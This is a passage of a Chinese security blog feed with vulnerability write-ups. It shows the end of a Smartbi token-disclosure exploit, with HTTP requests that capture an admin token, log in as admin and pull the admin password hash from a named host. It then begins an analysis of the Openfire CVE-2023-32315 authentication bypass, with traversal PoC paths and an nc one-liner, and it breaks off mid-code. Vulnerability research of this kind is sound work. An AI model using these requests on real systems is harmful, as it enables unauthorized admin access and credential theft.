</span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>7</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-ebnf"><span class="attribute">service</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 02 Aug 2023 02:48:31 GMT</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86a23c2d0a; Path=/smartbi; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=68897394A366E12C9C72BC8C12D57670; Path=/smartbi; HttpOnly</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>与此同时，观察服务器上接收到的HTTP报文。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ go run main.go                                                                                          ∞ ∞</span><br><span class="line">Server is running on *:8088</span><br><span class="line">--- Received HTTP Request ---</span><br><span class="line">POST /api/v1/configs/engine/smartbitoken HTTP/1.1</span><br><span class="line">User-Agent: [Apache-HttpClient/4.5.13 (Java/1.8.0_201)]</span><br><span class="line">Content-Length: [59]</span><br><span class="line">Accept-Encoding: [gzip,deflate]</span><br><span class="line">Content-Type: [application/json; charset=UTF-8]</span><br><span class="line">X-Forwarded-For: [x.x.x.x]</span><br><span class="line">X-Forwarded-Proto: [https]</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;token&quot;</span>:<span class="string">&quot;admin_I8a8a86440188d7d8d7d84ba80189be72528e2cfa&quot;</span>&#125;</span><br><span class="line">---------------------------</span><br></pre></td></tr></table></figure><p>然后，就可以拿这个token去请求<code>/login</code> ，从而获得一个有效的JSESSIONID。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/smartbix/api/monitor/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>47</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-gcode">admi<span class="symbol">n_I8</span>a<span class="number">8</span>a<span class="number">86440188</span>d<span class="number">7</span>d<span class="number">8</span>d<span class="number">7</span>d<span class="number">84</span>ba<span class="number">80189</span>be<span class="number">79</span>a<span class="number">6532</span>cff</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 02 Aug 2023 03:06:56 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>15</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; Path=/smartbi; HttpOnly</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>JSESSIONID=31A219361B718184DBB129256068F050; Path=/smartbi; HttpOnly</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>替换如下Cookie标头便能成功实现管理员用户登录。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; JSESSIONID=82214AE5A1234133379C4ED20E0A5CF8</span><br></pre></td></tr></table></figure><p><img src="/img/post/smartbi-monitorservice-token-disclosure/logged-in.png"></p><p>当然，还可以利用如上Cookie直接获取用户的密码，不过不是明文。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/smartbi/vision/RMIServlet</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>smartbi-test.miaozhen.com</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; JSESSIONID=82214AE5A1234133379C4ED20E0A5CF8; CookieLanguageName=ZH-CN</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>61</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"></span><br><span class="line"><span class="language-dts">classN<span class="attr">ame</span><span class="operator">=</span>UserService<span class="variable">&amp;</span>methodN<span class="attr">ame</span><span class="operator">=</span>getPassword<span class="variable">&amp;params</span>=[<span class="string">&quot;admin&quot;</span>]</span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 02 Aug 2023 03:06:56 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>71</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;retCode&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;result&quot;</span><span class="punctuation">:</span><span class="string">&quot;0e6e061838856bf47e1de730719fb2609&quot;</span><span class="punctuation">,</span><span class="attr">&quot;duration&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>如上响应中的<code>result</code>字段值，将其首位的<code>0</code>去掉就是一段MD5密文，解密后会发现是<code>admin@123</code>。</p><h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h2><p>目前厂商已发布安全补丁以修复这个安全问题，请通过如下链接下载安全补丁：</p><p><a href="https://www.smartbi.com.cn/patchinfo">https://www.smartbi.com.cn/patchinfo</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> bypass </tag>
            
            <tag> info-leak </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-32315 Openfire管理控制台认证绕过漏洞分析</title>
      <link href="/cve-2023-32315-openfire-auth-bypass.html"/>
      <url>/cve-2023-32315-openfire-auth-bypass.html</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#0x00-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">0x00 漏洞简介</a></li><li><a href="#0x01-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x01 影响版本</a></li><li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">0x02 漏洞分析</a><ul><li><a href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E6%A8%A1%E5%BC%8F%E5%8C%B9%E9%85%8D%E8%87%B4%E4%BD%BF%E7%9A%84%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87">通配符模式匹配致使的鉴权绕过</a></li><li><a href="#Jetty%E2%80%9C%E6%96%B0%E7%89%B9%E6%80%A7%E2%80%9D%E8%87%B4%E4%BD%BF%E7%9A%84%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86">Jetty“新特性”致使的路径遍历</a></li></ul></li><li><a href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">0x03 漏洞利用</a><ul><li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86">路径遍历</a></li><li><a href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E7%94%A8%E6%88%B7%E5%88%9B%E5%BB%BA">未授权用户创建</a></li><li><a href="#%E6%8F%92%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%AE%9E%E7%8E%B0RCE">插件上传实现RCE</a></li></ul></li><li><a href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">0x04 修复建议</a></li><li><a href="#0x05-%E5%8F%82%E8%80%83">0x05 参考</a></li></ul><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>Openfire是一个实时协作（RTC）服务器，编写于Java，它使用唯一被广泛采用的即时通讯开放协议XMPP，并提供Web管理界面。</p><p>Openfire的API定义了一种机制，允许使用通配符实现灵活的URL模式匹配以将某些URL从Web认证中排除。并且由于Openfire使用到的Web服务器支持解析非标准的UTF-16字符URL编码变体，导致了路径遍历漏洞。通配符模式匹配与路径遍历漏洞的组合可以使攻击者绕过认证访问后台管理控制台，最终通过后台上传恶意插件能够实现远程代码执行，完全地控制服务器权限。</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><ul><li><p>&gt;&#x3D;3.10.0, &lt;4.6.8</p></li><li><p>&gt;&#x3D;4.7.0, &lt;4.7.5</p></li></ul><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="通配符模式匹配致使的鉴权绕过"><a href="#通配符模式匹配致使的鉴权绕过" class="headerlink" title="通配符模式匹配致使的鉴权绕过"></a>通配符模式匹配致使的鉴权绕过</h3><p>Openfire的API定义了一种机制，可以将某些URL从Web认证中排除，此机制允许使用通配符，以实现灵活的URL模式匹配。在存在漏洞的4.7.4版本中，<code>xmppserver/src/main/webapp/WEB-INF/web.xml</code>配置文件的相关内容如下。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>AuthCheck<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jivesoftware.admin.AuthCheckFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>excludes<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span></span><br><span class="line">      login.jsp,index.jsp?logout=true,setup/index.jsp,setup/setup-*,.gif,.png,error-serverdown.jsp,loginToken.jsp</span><br><span class="line">    <span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里的本意是，符合如上列表中的文件，如登录页面、首次安装页面、静态图片&#x2F;CSS文件等，请求它们，便排除在Web认证之外。</p><p>通过版本对比，可以发现在安全的4.7.5版本中，<code>setup/index.jsp</code>和<code>setup/setup-*</code>已经被删除了。</p><p><img src="/img/post/openfire-cve-2023-32315-auth-bypass/web-xml.png"></p><p>Openfire的鉴权位于<code>org.jivesoftware.admin.AuthCheckFilter</code>类中的<code>doFilter</code>鉴权方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) req;</span><br><span class="line">    <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> (HttpServletResponse) res;</span><br><span class="line">    <span class="comment">// Do not allow framing; OF-997</span></span><br><span class="line">    response.setHeader(<span class="string">&quot;X-Frame-Options&quot;</span>, JiveGlobals.getProperty(<span class="string">&quot;adminConsole.frame-options&quot;</span>, <span class="string">&quot;SAMEORIGIN&quot;</span>));</span><br><span class="line">    <span class="comment">// Reset the defaultLoginPage variable</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">loginPage</span> <span class="operator">=</span> defaultLoginPage;</span><br><span class="line">    <span class="keyword">if</span> (loginPage == <span class="literal">null</span>) &#123;</span><br><span class="line">        loginPage = request.getContextPath() + (AuthFactory.isOneTimeAccessTokenEnabled() ? <span class="string">&quot;/loginToken.jsp&quot;</span> : <span class="string">&quot;/login.jsp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Get the page we&#x27;re on:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> request.getRequestURI().substring(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (url.startsWith(<span class="string">&quot;plugins/&quot;</span>)) &#123;</span><br><span class="line">        url = url.substring(<span class="string">&quot;plugins/&quot;</span>.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// See if it&#x27;s contained in the exclude list. If so, skip filter execution</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">doExclude</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span> (String exclude: excludes) &#123;</span><br><span class="line">        <span class="keyword">if</span> (testURLPassesExclude(url, exclude)) &#123;</span><br><span class="line">            doExclude = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!doExclude) &#123;</span><br><span class="line">        <span class="type">WebManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebManager</span>();</span><br><span class="line">        manager.init(request, response, request.getSession(), context);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">haveOneTimeToken</span> <span class="operator">=</span> manager.getAuthToken() <span class="keyword">instanceof</span> AuthToken.OneTimeAuthToken;</span><br><span class="line">        <span class="type">User</span> <span class="variable">loggedUser</span> <span class="operator">=</span> manager.getUser();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">loggedAdmin</span> <span class="operator">=</span> loggedUser == <span class="literal">null</span> ? <span class="literal">false</span> : adminManager.isUserAdmin(loggedUser.getUsername(), <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!haveOneTimeToken &amp;&amp; !loggedAdmin &amp;&amp; !authUserFromRequest(request)) &#123;</span><br><span class="line">            response.sendRedirect(getRedirectURL(request, loginPage, <span class="literal">null</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    chain.doFilter(req, res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在其中，可以看到如下片段代码，对<code>excludes</code>列表进行循环，执行<code>testURLPassesExclude(url, exclude)</code>方法的判断，若<code>testURLPassesExclude</code>返回true，那么<code>doExclude</code>的值也将为true，循环将会break，最终就能够成功实现鉴权绕过；否则当<code>doExclude</code>为false时，便会跳转登录页面。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// See if it&#x27;s contained in the exclude list. If so, skip filter execution</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">doExclude</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">for</span> (String exclude: excludes) &#123;</span><br><span class="line">  <span class="keyword">if</span> (testURLPassesExclude(url, exclude)) &#123;</span><br><span class="line">    doExclude = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!doExclude) &#123;</span><br><span class="line">  <span class="type">WebManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebManager</span>();</span><br><span class="line">  manager.init(request, response, request.getSession(), context);</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">haveOneTimeToken</span> <span class="operator">=</span> manager.getAuthToken() <span class="keyword">instanceof</span> AuthToken.OneTimeAuthToken;</span><br><span class="line">  <span class="type">User</span> <span class="variable">loggedUser</span> <span class="operator">=</span> manager.getUser();</span><br><span class="line">  <span class="type">boolean</span> <span class="variable">loggedAdmin</span> <span class="operator">=</span> loggedUser == <span class="literal">null</span> ? <span class="literal">false</span> : adminManager.isUserAdmin(loggedUser.getUsername(), <span class="literal">true</span>);</span><br><span class="line">  <span class="keyword">if</span> (!haveOneTimeToken &amp;&amp; !loggedAdmin &amp;&amp; !authUserFromRequest(request)) &#123;</span><br><span class="line">    response.sendRedirect(getRedirectURL(request, loginPage, <span class="literal">null</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">chain.doFilter(req, res);</span><br></pre></td></tr></table></figure><p>这能够表明，<code>testURLPassesExclude</code>方法就是实现鉴权绕过的关键。</p><p>在对该方法做进一步分析前，先回顾一个十五年的漏洞。其实最早在2008年，v3.6.0版本的Openfire就已经出现过一次路径遍历漏洞，漏洞编号是CVE-2008-6508，该漏洞的POC如下。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/setup/setup-/../../log.jsp</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>官方在v3.6.1版本只考虑了对原始的<code>..</code>进行了判断和过滤，这样修复的并不彻底，如下经过URL编码的<code>..</code>的payload仍然能够进行绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;GET /setup/setup-/%2E%2E/%2E%2E/log.jsp?log=info&amp;mode=asc&amp;lines=All&quot;</span> | nc localhost 9090</span><br></pre></td></tr></table></figure><p>于是官方在v3.6.2版本中又对<code>%2e</code>的情况进行了判断和过滤。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v3.6.2</span></span><br><span class="line"><span class="comment">// src/java/org/jivesoftware/admin/AuthCheckFilter.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">testURLPassesExclude</span><span class="params">(String url, String exclude)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">if</span> (exclude.endsWith(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(exclude.substring(<span class="number">0</span>, exclude.length() - <span class="number">1</span>))) &#123;</span><br><span class="line">            <span class="comment">// Now make sure that there are no &quot;..&quot; characters in the rest of the URL.</span></span><br><span class="line">            <span class="keyword">if</span> (!url.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; !url.toLowerCase().contains(<span class="string">&quot;%2e&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段代码延续至今，在十几年后的4.7.4版本中依然没发生变化，4.7.4版本的<code>testURLPassesExclude</code>方法内容如下，已省略部分无关代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">testURLPassesExclude</span><span class="params">(String url, String exclude)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// in the URL and then the resulting url must exactly match the exclude rule. If the exclude ends with a &quot;*&quot;</span></span><br><span class="line">    <span class="comment">// character then the URL is allowed if it exactly matches everything before the * and there are no &quot;..&quot;</span></span><br><span class="line">    <span class="comment">// characters after the &quot;*&quot;. All data in the URL before</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (exclude.endsWith(<span class="string">&quot;*&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.startsWith(exclude.substring(<span class="number">0</span>, exclude.length() - <span class="number">1</span>))) &#123;</span><br><span class="line">            <span class="comment">// Now make sure that there are no &quot;..&quot; characters in the rest of the URL.</span></span><br><span class="line">            <span class="keyword">if</span> (!url.contains(<span class="string">&quot;..&quot;</span>) &amp;&amp; !url.toLowerCase().contains(<span class="string">&quot;%2e&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过漏洞Reporter在CVE-2023-32315的GitHub Security Advisory中提供的POC <code>/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp</code>，可以发现这个路径恰恰是符合<code>excludes</code>列表中的<code>setup/setup-*</code>的通配符匹配。当二者共同传入进<code>testURLPassesExclude</code>方法中时，便能符合如上的几个判断，顺利返回true到<code>doExclude</code>中，使<code>doExclude</code>的值也为true，最终便成功的绕过<code>doExclude</code>的鉴权，顺利到达Openfire的Jetty Web服务器，由其继续处理。</p><h3 id="Jetty“新特性”致使的路径遍历"><a href="#Jetty“新特性”致使的路径遍历" class="headerlink" title="Jetty“新特性”致使的路径遍历"></a>Jetty“新特性”致使的路径遍历</h3><p>在早期版本的Openfire中，当时内置的Jetty Web服务器不支持解析<code>%u002e</code>这种编码，所以当时的安全补丁简单的过滤<code>..</code>和<code>%2e</code>，对于早期版本的Openfire是足够了的。</p><p>但是在之后版本的Openfire中，使用的Jetty Web服务器能够支持这种非标准的UTF-16字符URL编码变体，这种“新特性”导致原本的路径遍历漏洞又一次地出现在Openfire中，此处的“新”是相对而言。</p><p>Openfire v4.7.4中的Jetty版本为9.4.43.v20210629，请求路径的处理位于<code>org.eclipse.jetty.http.HttpURI</code>类，跟进其中的<code>parse</code>方法，来到它的末尾关键代码片段。</p><p><img src="/img/post/openfire-cve-2023-32315-auth-bypass/httpuri-parse.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (_path != <span class="literal">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// The RFC requires this to be canonical before decoding, but this can leave dot segments and dot dot segments</span></span><br><span class="line">  <span class="comment">// which are not canonicalized and could be used in an attempt to bypass security checks.</span></span><br><span class="line">  <span class="type">String</span> <span class="variable">decodedNonCanonical</span> <span class="operator">=</span> URIUtil.decodePath(_path);</span><br><span class="line">  _decodedPath = URIUtil.canonicalPath(decodedNonCanonical);</span><br><span class="line">  <span class="keyword">if</span> (_decodedPath == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Bad URI&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码会调用<code>URIUtil.decodePath</code>方法进行解码，然后使用<code>URIUtil.canonicalPath</code>对解码后的路径做规范化处理。</p><p>解码路径的方法位于<code>org.eclipse.jetty.util.URIUtil#decodePath</code>，完整内容如下。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 